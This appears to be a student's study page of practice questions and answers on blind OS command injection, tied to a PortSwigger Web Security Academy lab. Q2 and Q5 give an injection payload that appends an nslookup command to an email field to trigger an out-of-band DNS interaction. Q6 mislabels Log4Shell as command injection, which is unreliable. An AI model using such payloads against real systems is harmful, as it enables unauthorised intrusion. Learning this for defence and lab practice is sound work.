---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the difference between in-band and blind OS command injection vulnerabilities?**

The primary difference between in-band and blind OS command injection vulnerabilities lies in how the attacker receives feedback from the injected command. In an in-band command injection, the output of the injected command is directly visible in the application's response, allowing the attacker to see the results immediately. In contrast, a blind command injection does not provide immediate feedback through the application's response. Instead, the attacker must rely on out-of-band methods, such as triggering interactions with an external server they control, to confirm the success of their injection attempt.

**Q2. How can you exploit a blind OS command injection vulnerability to confirm its presence?**

To exploit a blind OS command injection vulnerability, you can trigger an out-of-band interaction with an external server that you control. For example, you can use a DNS lookup to a collaborator server like Burp Collaborator. By injecting a command that performs a DNS lookup to your collaborator server, you can confirm the presence of the vulnerability when the server records the interaction. Here’s an example payload:

```
test@test.com; nslookup $(burp_collaborator_client)
```

Replace `$(burp_collaborator_client)` with the actual collaborator client address provided by Burp Suite. If the DNS lookup is recorded by the collaborator server, it confirms that the injection was successful.

**Q3. Why is it important to use a tool like Burp Collaborator in blind OS command injection attacks?**

Burp Collaborator is crucial in blind OS command injection attacks because it allows attackers to detect out-of-band interactions initiated by the vulnerable application. Since the application does not provide direct feedback about the command execution, Burp Collaborator serves as an external listener that can confirm whether the injected command was executed. This is particularly useful when the application's responses do not reveal the outcome of the command injection.

**Q4. Explain how the firewall in the Web Security Academy prevents the use of arbitrary external systems during blind OS command injection exercises.**

The firewall in the Web Security Academy is configured to block interactions between the labs and arbitrary external systems to prevent misuse. This means that attackers cannot simply choose any external server to communicate with; instead, they must use specific services like Burp Collaborator that are whitelisted by the platform. This setup ensures that the labs remain safe and controlled environments for learning and testing purposes.

**Q5. How can you ensure that your command injection payload is correctly interpreted by the application?**

To ensure that your command injection payload is correctly interpreted by the application, you need to pay attention to the syntax and encoding of the payload. Use appropriate delimiters and escape characters to avoid syntax errors. Additionally, URL-encode the payload if necessary to ensure that special characters are properly handled by the application. For instance, in the payload:

```
test@test.com; nslookup $(burp_collaborator_client)
```

Make sure to URL-encode the entire payload before submitting it to the application. This can be done using tools like Burp Suite’s built-in URL encoder or manually by replacing special characters with their corresponding percent-encoded values.

**Q6. Describe a recent real-world example where blind OS command injection was exploited.**

A notable real-world example of blind OS command injection is the exploitation of the Log4j vulnerability (CVE-2021-44228). Although primarily a logging flaw, it often led to remote code execution due to command injection. Attackers could inject malicious payloads into log messages, which were then processed by the vulnerable application. In some cases, these payloads included commands that triggered out-of-band interactions, similar to the technique described in the lab. This allowed attackers to confirm the success of their injection attempts and potentially gain further access to the system.

---
<!-- nav -->
[[07-Understanding Out-of-Band Interaction|Understanding Out-of-Band Interaction]] | [[Web Security (PortSwigger)/10-OS Command Injection/05-Lab 4 Blind OS command injection with out of band interaction/00-Overview|Overview]]
